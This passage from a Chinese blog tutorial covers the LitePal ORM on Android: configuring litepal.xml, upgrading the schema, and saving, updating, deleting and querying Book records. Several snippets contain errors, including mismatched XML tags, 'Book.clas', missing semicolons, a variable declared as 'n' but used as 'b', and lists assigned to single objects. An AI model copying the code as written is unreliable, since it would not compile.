<h5 id="1-5-修改litepal-xml文件"><a href="#1-5-修改litepal-xml文件" class="headerlink" title="1.5 修改litepal.xml文件"></a>1.5 修改litepal.xml文件</h5><p>刚才创建的litepal.xml文件中有一个list的标签，里面就是放对应的实体类，可以通过map标签建立与Litepal的关联，注意mapping中的class必须是实体类的完整类名</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"&gt;</span></span><br><span class="line"><span class="meta">&lt;litepal&gt;</span></span><br><span class="line"><span class="meta">	&lt;!--数据库名称--&gt;</span></span><br><span class="line"><span class="meta">	&lt;dbname value="BookStore"&gt;&lt;/dbname&gt;</span></span><br><span class="line"><span class="meta">	&lt;!--数据库版本--&gt;</span></span><br><span class="line"><span class="meta">	&lt;version value="1"&gt;&lt;/value&gt;</span></span><br><span class="line"><span class="meta">	</span></span><br><span class="line"><span class="meta">	&lt;!--数据库的表对应的类--&gt;</span></span><br><span class="line"><span class="meta">	&lt;list&gt;</span></span><br><span class="line"><span class="meta">  &lt;mapping class="com.example.litepaltest.Book"&gt;&lt;/mapping&gt;</span></span><br><span class="line"><span class="meta">	&lt;/list&gt;</span></span><br><span class="line"><span class="meta">&lt;/litepal&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="1-6-执行数据库的创建"><a href="#1-6-执行数据库的创建" class="headerlink" title="1.6 执行数据库的创建"></a>1.6 执行数据库的创建</h5><p>和直接使用SQLiteOpenHelper一样，只要获取数据库实例就会自动执行数据库和表的创建工作。只不过这里使用LitePal自带的获取方法，更加简单。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">btn_create.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        LitePal.getDatabase()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>这样点击btn_create按钮就会执行数据库和Book表的创建工作了。</p>
<h3 id="二、升级数据库"><a href="#二、升级数据库" class="headerlink" title="二、升级数据库"></a>二、升级数据库</h3><p>如果想升级数据库，比如给Book表增加一个出版社（press）的列，或者想添加一个新的表，怎么做呢?非常简单</p>
<p>（1）只需要给Book实体类添加新的press字段，并设置getter和setter方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Book</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">private</span> String press;</span><br><span class="line">  </span><br><span class="line">  	<span class="function"><span class="keyword">public</span> String <span class="title">getPress</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> press;</span><br><span class="line">    &#125;</span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPress</span><span class="params">(String press)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.press=press</span><br><span class="line">    &#125;</span><br><span class="line">  	...</span><br><span class="line">      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>（2）新建一个实体类Category</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Category</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">  	<span class="keyword">private</span> String categoryName;</span><br><span class="line">  	<span class="keyword">private</span> <span class="keyword">int</span> categoryCode;</span><br><span class="line">  	</span><br><span class="line">  	<span class="comment">//getter和setter方法</span></span><br><span class="line">  	...</span><br><span class="line">      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>（3）修改litepal.xml文件，修改里面数据库版本，添加新增的Category类mapping</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"&gt;</span></span><br><span class="line"><span class="meta">&lt;litepal&gt;</span></span><br><span class="line"><span class="meta">	&lt;!--数据库名称--&gt;</span></span><br><span class="line"><span class="meta">	&lt;dbname value="BookStore"&gt;&lt;/dbname&gt;</span></span><br><span class="line"><span class="meta">	&lt;!--数据库版本--&gt;</span></span><br><span class="line"><span class="meta">	&lt;version value="2"&gt;&lt;/value&gt;</span></span><br><span class="line"><span class="meta">	</span></span><br><span class="line"><span class="meta">	&lt;!--数据库的表对应的类--&gt;</span></span><br><span class="line"><span class="meta">	&lt;list&gt;</span></span><br><span class="line"><span class="meta">  &lt;mapping class="com.example.litepaltest.Book"&gt;&lt;/mapping&gt;</span></span><br><span class="line"><span class="meta">	&lt;mapping class="com.example.litepaltest.Category"&gt;&lt;/mapping&gt;</span></span><br><span class="line"><span class="meta">	&lt;/list&gt;</span></span><br><span class="line"><span class="meta">&lt;/litepal&gt;</span></span><br></pre></td></tr></table></figure>
<p>这时重新运行程序，单价btn_create按钮，就完成了数据库的更新操作</p>
<h3 id="三、操作数据库"><a href="#三、操作数据库" class="headerlink" title="三、操作数据库"></a>三、操作数据库</h3><h5 id="3-1-添加数据"><a href="#3-1-添加数据" class="headerlink" title="3.1 添加数据"></a>3.1 添加数据</h5><p>有了LitePal就不再需要ContentValue对象了，我们可以执行使用对象实体类来添加数据，只是需要修改一些实体类文件，让实体类继承自LitePal中的DataSupport类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Book</span> <span class="keyword">extends</span> <span class="title">DataSupport</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>添加数据，只需要创建实体类，设置参数，然后调用实体类的<code>save()</code>方法即可，当然<code>save()</code>方法是DataSupport内部的方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">btn_addBookData.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        Book b=<span class="keyword">new</span> Book();</span><br><span class="line">      	b.setName(<span class="string">"书名"</span>);</span><br><span class="line">      	b.setAuthor(<span class="string">"作者"</span>);</span><br><span class="line">      	b.setPages(<span class="number">300</span>);</span><br><span class="line">      	b.setPrice(<span class="number">100.00</span>);</span><br><span class="line">      	b.setPress(<span class="string">"出版社"</span>);</span><br><span class="line">      	<span class="comment">//保存</span></span><br><span class="line">      	b.save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>这时候数据就添加成功了，可以通过adb进行查看</p>
<h5 id="3-2-更新数据"><a href="#3-2-更新数据" class="headerlink" title="3.2 更新数据"></a>3.2 更新数据</h5><p>更新数据，可以对已存储的对象重新复制，然后重新调用<code>save()</code>方法，就完成了更新操作。</p>
<p>那么如何确定对象是否是已存储对象呢？可以调用<code>model.isSave()</code>方法来判断，只有在两种情况下该方法才会返回true</p>
<ul>
<li>一种情况是已经调用过model.save()方法去添加数据了，此时model是已存储的对象</li>
<li>另一种是model是通过LitePal的api查询出来的对象，也会被认为是已存储的对象</li>
</ul>
<p>实例代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">btn_updateBookData.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        Book b=<span class="keyword">new</span> Book();</span><br><span class="line">      	b.setName(<span class="string">"书名"</span>);</span><br><span class="line">      	b.setAuthor(<span class="string">"作者"</span>);</span><br><span class="line">      	b.setPages(<span class="number">300</span>);</span><br><span class="line">      	b.setPrice(<span class="number">100.00</span>);</span><br><span class="line">      	b.setPress(<span class="string">"出版社"</span>);</span><br><span class="line">      	<span class="comment">//保存</span></span><br><span class="line">      	b.save();</span><br><span class="line">      </span><br><span class="line">      	<span class="comment">//修改数据</span></span><br><span class="line">      	b.setPrice(<span class="number">99.00</span>);</span><br><span class="line">      	b.save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>此时数据库新增了一条数据，但是书的价格不是原先的100.00，而是99.00了。</p>
<p>但是这种更新的方式限制性比较大，如何快速对多条数据进行更新的，可以使用<code>updateAll()</code>方法，这个方法与SQLiteDatabase中的update方法where参数有些类似，但是更加简洁，同样参数若不指定表示更新所有</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">btn_updateBooks.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        Book b=<span class="keyword">new</span> Book();</span><br><span class="line">      </span><br><span class="line">      	<span class="comment">//修改数据</span></span><br><span class="line">      	b.setPrice(<span class="number">9.99</span>);</span><br><span class="line">      	b.setPress(<span class="string">"大白出版社"</span>);</span><br><span class="line">      	b.updateAll(<span class="string">"name = ? and author = ? "</span>, <span class="string">"红楼梦"</span>,<span class="string">"曹雪芹"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>此时就会把所有作者为曹雪芹并且名字为红楼梦的数的价格改为9.99，出版社改为大白出版社。</p>
<p>需要注意的是，如果想把某一字段改为默认值，是不可以使用上面的set方法的。比如Java中默认的int类型值为0，boolean值为false，String值为null。</p>
<p>如果想把pages设为0，通过b.setPages(0)，执行updateAll()操纵是不会更新数据的，对于想要将数据更改为默认值的操作，LitePal提供了<code>setToDefault()</code>的方法，将要更改的字段作为参数传进去即可</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Book n=<span class="keyword">new</span> Book();</span><br><span class="line">b.setToDefault(<span class="string">"pages"</span>);</span><br><span class="line">b.updateAll();</span><br></pre></td></tr></table></figure>
<p>这样就能将相应的字段更新为默认的数值了。</p>
<h5 id="3-3-删除数据"><a href="#3-3-删除数据" class="headerlink" title="3.3 删除数据"></a>3.3 删除数据</h5><p>使用LitePal删除吧数据主要两种：</p>
<ul>
<li>直接调用已存储对象的<code>delete()</code>方法即可，对于LitePal提供的api查询出来的对象都可以使用该方法</li>
<li>另一种方法是使用DataSupport的<code>deleteAll()</code>方法，参数第一个是实体类，后面的同where语法</li>
</ul>
<p>方法二的代码，删除Book表中所有价格小于15的数据。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">btn_deleteData.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        DataSupport.deleteAll(Book.clas,<span class="string">"price &lt; ?"</span> , <span class="string">"15"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>当然如果不指定约束条件，就是删除所有的记录。</p>
<h5 id="3-4-查询数据"><a href="#3-4-查询数据" class="headerlink" title="3.4 查询数据"></a>3.4 查询数据</h5><p>查询操作同样是DataSupport类提供的，常用的有</p>
<ul>
<li>findAll() ：查询所有数据</li>
<li>findFirst() ：查询首条记录</li>
<li>findLast() ： 查询末条记录</li>
<li>select().find() ： 查询指定列的数据</li>
<li>where().find() ： 查询指定约束条件的数据</li>
<li>order().find() ： 指定结果的排序方式</li>
<li>limit().find() ： 指定查询结果的数量</li>
<li>limit().offset().find() ： 指定查询结果的偏移量</li>
</ul>
<p>当然可以任意进行组合</p>
<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查询所有数据</span></span><br><span class="line">List&lt;Book&gt; books=DataSupport.findAll(Book<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询第一条数据</span></span><br><span class="line">Book b=DataSupport.findFirst(Book<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询最后一条数据</span></span><br><span class="line">Book b=DataSupport.findlast(Book<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询指定列的数据</span></span><br><span class="line">Book b=DataSupport.select(<span class="string">"name"</span>,<span class="string">"author"</span>).find(Book<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询满足约束条件的数据</span></span><br><span class="line">Book b=DataSupport.where(<span class="string">"pages &gt; ?"</span>,<span class="string">"100"</span>).find(Book<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询结果按指定方式排序</span></span><br><span class="line">Book b=DataSupport.order(<span class="string">"price desc"</span>).find(Book<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//指定查询结果的数量,返回第1、2、3条数据</span></span><br><span class="line">Book b=DataSupport.limit(<span class="number">3</span>).find(Book<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//指定查询结果的偏移量,返回第2、3、4条数据</span></span><br><span class="line">Book b=DataSupport.limit(<span class="number">3</span>).offset(<span class="number">1</span>).find(Book<span class="class">.<span class="keyword">class</span>)</span>;</span><br></pre></td></tr></table></figure>
<h5 id="3-5-使用原生sql语句"><a href="#3-5-使用原生sql语句" class="headerlink" title="3.5 使用原生sql语句"></a>3.5 使用原生sql语句</h5><p>DataSupport同样支持原生SQL语句的操作，提供了<code>findBySQL()</code>方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String sql=<span class="string">"select * from Book where pages &gt; ? and price &lt; ?"</span>;</span><br><span class="line">Cursor cursor=DataSupport.findBySQL(sql,<span class="string">"100"</span>,<span class="string">"100.00"</span>);</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/01/24/android-litepal/" data-id="ck55it3mb002pcglr5vg11748" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android/">Android</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <a class="extend prev" rel="prev" href="/page/2/">&laquo; __('prev')</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">__('next') &raquo;</a>
  </nav>
</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GIS/">GIS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Gradle/">Gradle</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JavaScript/">JavaScript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Markdown/">Markdown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/React/">React</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpringBoot/">SpringBoot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WebAssembly/">WebAssembly</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/npm/">npm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sublime/">sublime</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tomcat/">tomcat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webgl/">webgl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webpack/">webpack</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/GIS/" style="font-size: 11.67px;">GIS</a> <a href="/tags/Gradle/" style="font-size: 10px;">Gradle</a> <a href="/tags/JavaScript/" style="font-size: 16.67px;">JavaScript</a> <a href="/tags/Markdown/" style="font-size: 10px;">Markdown</a> <a href="/tags/React/" style="font-size: 18.33px;">React</a> <a href="/tags/SpringBoot/" style="font-size: 11.67px;">SpringBoot</a> <a href="/tags/WebAssembly/" style="font-size: 10px;">WebAssembly</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/java/" style="font-size: 13.33px;">java</a> <a href="/tags/linux/" style="font-size: 11.67px;">linux</a> <a href="/tags/npm/" style="font-size: 10px;">npm</a> <a href="/tags/sublime/" style="font-size: 10px;">sublime</a> <a href="/tags/tomcat/" style="font-size: 11.67px;">tomcat</a> <a href="/tags/webgl/" style="font-size: 15px;">webgl</a> <a href="/tags/webpack/" style="font-size: 10px;">webpack</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/04/">April 2015</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/01/09/js中的EventLoop/">js中的EventLoop</a>
          </li>
        
          <li>
            <a href="/2020/01/07/WebAssembly初体验/">WebAssembly初体验</a>
          </li>
        
          <li>
            <a href="/2019/12/24/webgl2基础/">webgl2基础</a>
          </li>
        
          <li>
            <a href="/2019/12/24/low-graphics-mode解决方法/">low-graphics mode解决方法</a>
          </li>
        
          <li>
            <a href="/2019/12/24/Ubuntu固定ip和软件愿/">Ubuntu固定ip和软件愿</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 杨亚辉<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>

  </div>
</body>
</html>